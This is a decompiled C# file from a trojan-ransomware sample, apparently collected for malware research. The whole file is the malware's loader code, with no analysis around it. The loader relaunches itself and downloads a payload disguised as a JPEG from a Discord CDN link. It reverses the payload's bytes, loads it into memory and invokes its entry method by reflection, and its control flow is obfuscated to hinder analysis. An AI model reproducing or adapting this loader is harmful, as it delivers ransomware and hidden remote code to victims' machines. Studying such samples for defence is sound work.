// Decompiled with JetBrains decompiler
// Type: Atsthjjfumvdxjgbafdfm.SchemaValueWriter
// Assembly: Sjxupcet, Version=92.4515.159.1, Culture=neutral, PublicKeyToken=null
// MVID: 79360DD6-0DD9-47BB-A5C4-8F14F6D8CD20
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.MSIL.Blocker.gen-64ae5410f978df0f48dcc67508820ea230c566967e002703c23c67088883b3bf.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace Atsthjjfumvdxjgbafdfm
{
  internal class SchemaValueWriter
  {
    private static byte[] m_Strategy;
    private static SchemaValueWriter CalculateFacade;

    [STAThread]
    private static void Main(string[] args)
    {
      if (args.Length == 1 && args[0].ToString() == Environment.UserName)
      {
        SchemaValueWriter.SetupStrategy();
        SchemaValueWriter.ViewStrategy();
        SchemaValueWriter.InterruptStrategy();
      }
      else
      {
        typeof (Thread).GetMethod("Sleep", new Type[1]
        {
          typeof (int)
        }).Invoke((object) null, new object[1]
        {
          (object) 10000
        });
        typeof (Thread).GetMethod("Sleep", new Type[1]
        {
          typeof (int)
        }).Invoke((object) null, new object[1]
        {
          (object) 10000
        });
        Process.Start(Process.GetCurrentProcess().MainModule.FileName, Environment.UserName);
      }
    }

    private static void ViewStrategy() => Assembly.Load(SchemaValueWriter.m_Strategy);

    private static void SetupStrategy()
    {
      int num = 1;
      while (true)
      {
        switch (num)
        {
          case 1:
            num = \u003CModule\u003E\u007B3d727352\u002D7f25\u002D48af\u002D8725\u002Df05974804181\u007D.m_d1e931ba3fdf4964853b7e7e307c9e70.m_122d0f8ad32e4afbadc3874b11bfbc3c != 0 ? 0 : 0;
            continue;
          case 2:
            goto label_2;
          case 3:
            SchemaValueWriter.m_Strategy = new BinaryReader((Stream) SchemaValueWriter.PrepareFacade(SchemaValueWriter.CallFacade((object) WebRequest.Create("http://cdn.discordapp.com/attachments/932607293869146142/941782821578633216/Sjxupcet.jpg")))).ReadBytes(82986041);
            num = \u003CModule\u003E\u007B3d727352\u002D7f25\u002D48af\u002D8725\u002Df05974804181\u007D.m_d1e931ba3fdf4964853b7e7e307c9e70.m_2ce3a561540d412b83294020764efd2e == 0 ? 0 : 2;
            continue;
          default:
            try
            {
              SchemaValueWriter.InitFacade(SecurityProtocolType.Tls12);
              goto case 3;
            }
            catch
            {
              goto case 3;
            }
        }
      }
label_2:
      SchemaValueWriter.VerifyFacade((object) SchemaValueWriter.m_Strategy, 0, SchemaValueWriter.m_Strategy.Length);
    }

    private static void InterruptStrategy()
    {
      int num = 2;
      while (true)
      {
        bool flag1;
        string str;
        bool flag2;
        int index1;
        int index2;
        int index3;
        bool flag3;
        bool flag4;
        switch (num)
        {
          case 1:
          case 5:
            flag4 = index2 < ((AppDomain) SchemaValueWriter.CalcFacade()).GetAssemblies().Length;
            num = \u003CModule\u003E\u007B3d727352\u002D7f25\u002D48af\u002D8725\u002Df05974804181\u007D.m_d1e931ba3fdf4964853b7e7e307c9e70.m_01114d77ff0043589448ce5c2643021b == 0 ? 2 : 13;
            continue;
          case 2:
            index2 = 0;
            num = \u003CModule\u003E\u007B3d727352\u002D7f25\u002D48af\u002D8725\u002Df05974804181\u007D.m_d1e931ba3fdf4964853b7e7e307c9e70.m_f7676c1507394a2a84a7b6af826bb0e2 == 0 ? 1 : 0;
            continue;
          case 3:
            ++index3;
            break;
          case 4:
            str = (string) ((Type) SchemaValueWriter.CompareFacade((object) ((AppDomain) SchemaValueWriter.CalcFacade()).GetAssemblies()[index2])[index1]).GetMethods()[index3].Invoke((object) null, (object[]) null);
            num = \u003CModule\u003E\u007B3d727352\u002D7f25\u002D48af\u002D8725\u002Df05974804181\u007D.m_d1e931ba3fdf4964853b7e7e307c9e70.m_a24eb49714b741b7b93248d6239f2a51 == 0 ? 6 : 17;
            continue;
          case 6:
            ++index2;
            num = 5;
            continue;
          case 7:
            SchemaValueWriter.MapFacade();
            num = \u003CModule\u003E\u007B3d727352\u002D7f25\u002D48af\u002D8725\u002Df05974804181\u007D.m_d1e931ba3fdf4964853b7e7e307c9e70.m_e43355b5c8c1456aa5eaf931736c3698 != 0 ? 4 : 1;
            continue;
          case 8:
            index1 = 0;
            goto case 11;
          case 9:
            goto label_23;
          case 10:
            if (!flag1)
            {
              num = 3;
              continue;
            }
            goto case 7;
          case 11:
            flag2 = index1 < SchemaValueWriter.CompareFacade(SchemaValueWriter.ResolveFacade(SchemaValueWriter.CalcFacade())[index2]).Length;
            num = \u003CModule\u003E\u007B3d727352\u002D7f25\u002D48af\u002D8725\u002Df05974804181\u007D.m_d1e931ba3fdf4964853b7e7e307c9e70.m_f9d5c02b7d5f46819543cda79f82da51 == 0 ? 1 : 16;
            continue;
          case 12:
            ++index1;
            num = 11;
            continue;
          case 13:
            if (!flag4)
            {
              num = 9;
              continue;
            }
            goto case 8;
          case 14:
            if (flag3)
            {
              flag1 = SchemaValueWriter.RemoveFacade(SchemaValueWriter.PublishFacade((object) ((Type) SchemaValueWriter.CompareFacade(SchemaValueWriter.ResolveFacade((object) AppDomain.CurrentDomain)[index2])[index1]).GetMethods()[index3]), (object) "Mkgqdol");
              num = 10;
              continue;
            }
            num = \u003CModule\u003E\u007B3d727352\u002D7f25\u002D48af\u002D8725\u002Df05974804181\u007D.m_d1e931ba3fdf4964853b7e7e307c9e70.m_1711d16d94cc4f35ab6714eb02699b15 != 0 ? 7 : 12;
            continue;
          case 16:
            if (flag2)
            {
              num = \u003CModule\u003E\u007B3d727352\u002D7f25\u002D48af\u002D8725\u002Df05974804181\u007D.m_d1e931ba3fdf4964853b7e7e307c9e70.m_f1e678edf49a4b6ba2d6daa4013644db == 0 ? 0 : 0;
              continue;
            }
            goto case 6;
          case 17:
            Console.WriteLine(str);
            goto case 3;
          default:
            index3 = 0;
            break;
        }
        flag3 = index3 < ((Assembly) SchemaValueWriter.ResolveFacade((object) AppDomain.CurrentDomain)[index2]).GetExportedTypes()[index1].GetMethods().Length;
        num = \u003CModule\u003E\u007B3d727352\u002D7f25\u002D48af\u002D8725\u002Df05974804181\u007D.m_d1e931ba3fdf4964853b7e7e307c9e70.m_f0ebb37116c34909ad8069aa00da307c != 0 ? 4 : 14;
      }
label_23:;
    }

    internal static bool PrintFacade() => SchemaValueWriter.CalculateFacade == null;

    internal static SchemaValueWriter RateFacade() => SchemaValueWriter.CalculateFacade;

    internal static void InitFacade([In] SecurityProtocolType obj0) => ServicePointManager.SecurityProtocol = obj0;

    internal static object CallFacade([In] object obj0) => (object) ((WebRequest) obj0).GetResponse();

    internal static object PrepareFacade([In] object obj0) => (object) ((WebResponse) obj0).GetResponseStream();

    internal static void VerifyFacade([In] object obj0, [In] int obj1, [In] int obj2) => Array.Reverse((Array) obj0, obj1, obj2);

    internal static object ResolveFacade([In] object obj0) => (object) ((AppDomain) obj0).GetAssemblies();

    internal static object CompareFacade([In] object obj0) => (object) ((Assembly) obj0).GetExportedTypes();

    internal static object PublishFacade([In] object obj0) => (object) ((MemberInfo) obj0).Name;

    internal static bool RemoveFacade([In] object obj0, [In] object obj1) => (string) obj0 == (string) obj1;

    internal static void MapFacade() => GC.Collect();

    internal static object CalcFacade() => (object) AppDomain.CurrentDomain;
  }
}
